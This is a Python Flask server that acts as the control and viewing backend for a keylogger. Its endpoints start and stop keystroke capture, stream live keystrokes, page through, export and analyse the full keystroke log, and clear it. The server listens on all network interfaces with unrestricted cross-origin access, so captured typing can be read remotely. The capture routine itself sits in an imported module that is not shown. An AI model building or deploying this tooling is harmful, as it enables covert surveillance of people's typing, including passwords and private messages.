"""
╔══════════════════════════════════════════════════════════════════╗
║         FLASK API SERVER — KeyLogger Dashboard Backend           ║
╚══════════════════════════════════════════════════════════════════╝
Run:  python server.py
API available at http://localhost:5000
"""
import os
import json
import threading
from datetime import datetime
from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS
# ─── Import keylogger module ─────────────────────────────────────
import sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from keylogger import start_keylogger, get_session_data, session_data, lock
# ─── Paths ───────────────────────────────────────────────────────
BASE_DIR  = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOG_DIR   = os.path.join(BASE_DIR, "logs")
JSON_FILE = os.path.join(LOG_DIR, "keystrokes.json")
STATE_FILE = os.path.join(LOG_DIR, "state.json")
FRONTEND  = os.path.join(BASE_DIR, "frontend")
# ─── App setup ───────────────────────────────────────────────────
app = Flask(__name__, static_folder=FRONTEND)
CORS(app)
keylogger_thread = None
# ══════════════════════════════════════════════════════════════════
#  Utility helpers
# ══════════════════════════════════════════════════════════════════
def load_json_log():
    """Load all keystroke records from the JSON log file."""
    if not os.path.exists(JSON_FILE):
        return []
    try:
        with open(JSON_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (json.JSONDecodeError, ValueError):
        return []
def load_text_log():
    """Load plain text log lines."""
    log_file = os.path.join(LOG_DIR, "keystrokes.log")
    if not os.path.exists(log_file):
        return []
    with open(log_file, "r", encoding="utf-8") as f:
        return [line.rstrip() for line in f.readlines() if line.strip()]
# ══════════════════════════════════════════════════════════════════
#  Serve Frontend Pages
# ══════════════════════════════════════════════════════════════════
@app.route("/")
def serve_index():
    return send_from_directory(FRONTEND, "index.html")
@app.route("/<path:filename>")
def serve_static(filename):
    return send_from_directory(FRONTEND, filename)
# ══════════════════════════════════════════════════════════════════
#  API Routes
# ══════════════════════════════════════════════════════════════════
@app.route("/api/status", methods=["GET"])
def api_status():
    """Return current keylogger session status."""
    data = get_session_data()
    return jsonify({
        "is_running": data.get("is_running", False),
        "session_id": data.get("session_id"),
        "start_time": data.get("start_time"),
        "total_keystrokes": data.get("total_keystrokes", 0),
        "regular_keys": data.get("regular_keys", 0),
        "special_keys": data.get("special_keys", 0),
        "backspaces": data.get("backspaces", 0),
        "server_time": datetime.now().isoformat()
    })
@app.route("/api/start", methods=["POST"])
def api_start():
    """Start the keylogger in a background thread."""
    global keylogger_thread
    if session_data.get("is_running"):
        return jsonify({"status": "already_running", "message": "Keylogger is already active."}), 400
    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()
    return jsonify({"status": "started", "message": "Keylogger started successfully."})
@app.route("/api/stop", methods=["POST"])
def api_stop():
    """Mark the session as stopped (listener stops on ESC, or via this flag)."""
    with lock:
        session_data["is_running"] = False
    return jsonify({"status": "stopped", "message": "Keylogger stop signal sent."})
@app.route("/api/keystrokes", methods=["GET"])
def api_keystrokes():
    """Return paginated keystrokes from the JSON log."""
    page  = int(request.args.get("page", 1))
    limit = int(request.args.get("limit", 50))
    key_type = request.args.get("type", None)  # 'regular' | 'special'
    records = load_json_log()
    if key_type:
        records = [r for r in records if r.get("type") == key_type]
    total = len(records)
    start = (page - 1) * limit
    end   = start + limit
    paged = records[start:end]
    return jsonify({
        "total": total,
        "page": page,
        "limit": limit,
        "keystrokes": paged
    })
@app.route("/api/live", methods=["GET"])
def api_live():
    """Return the last N keystrokes from memory for the live feed."""
    n = int(request.args.get("n", 30))
    data = get_session_data()
    keystrokes = data.get("keystrokes", [])
    return jsonify({
        "keystrokes": keystrokes[-n:],
        "total": data.get("total_keystrokes", 0),
        "is_running": data.get("is_running", False)
    })
@app.route("/api/analytics", methods=["GET"])
def api_analytics():
    """Return computed analytics over the full log."""
    records = load_json_log()
    if not records:
        return jsonify({"error": "No data available"}), 404
    # Key frequency
    freq = {}
    for r in records:
        key = r.get("display", r.get("key", "?"))
        freq[key] = freq.get(key, 0) + 1
    top_keys = sorted(freq.items(), key=lambda x: x[1], reverse=True)[:20]
    # Per-hour breakdown
    hour_counts = {str(h).zfill(2): 0 for h in range(24)}
    for r in records:
        try:
            hour = r["timestamp"].split(" ")[1].split(":")[0]
            hour_counts[hour] = hour_counts.get(hour, 0) + 1
        except (KeyError, IndexError):
            pass
    total = len(records)
    special = sum(1 for r in records if r.get("type") == "special")
    regular = total - special
    return jsonify({
        "total_keystrokes": total,
        "regular_keys": regular,
        "special_keys": special,
        "top_keys": [{"key": k, "count": c} for k, c in top_keys],
        "hourly_distribution": [{"hour": h, "count": c} for h, c in hour_counts.items()]
    })
@app.route("/api/logs/text", methods=["GET"])
def api_logs_text():
    """Return plain text log lines."""
    lines = load_text_log()
    return jsonify({"lines": lines, "total": len(lines)})
@app.route("/api/logs/export", methods=["GET"])
def api_logs_export():
    """Export all keystrokes as JSON."""
    records = load_json_log()
    return jsonify(records)
@app.route("/api/clear", methods=["DELETE"])
def api_clear():
    """Clear all log files and reset session counters."""
    for fname in [JSON_FILE, os.path.join(LOG_DIR, "keystrokes.log")]:
        if os.path.exists(fname):
            os.remove(fname)
    with lock:
        session_data["total_keystrokes"] = 0
        session_data["regular_keys"] = 0
        session_data["special_keys"] = 0
        session_data["backspaces"] = 0
        session_data["keystrokes"] = []
    return jsonify({"status": "cleared", "message": "All logs cleared."})
# ══════════════════════════════════════════════════════════════════
#  Main
# ══════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════════════╗
║    🔐 KeyLogger Dashboard Server                                 ║
║    📡 Running on http://localhost:5000                           ║
║    📖 API docs: /api/status | /api/keystrokes | /api/analytics   ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    app.run(host="0.0.0.0", port=5000, debug=False)
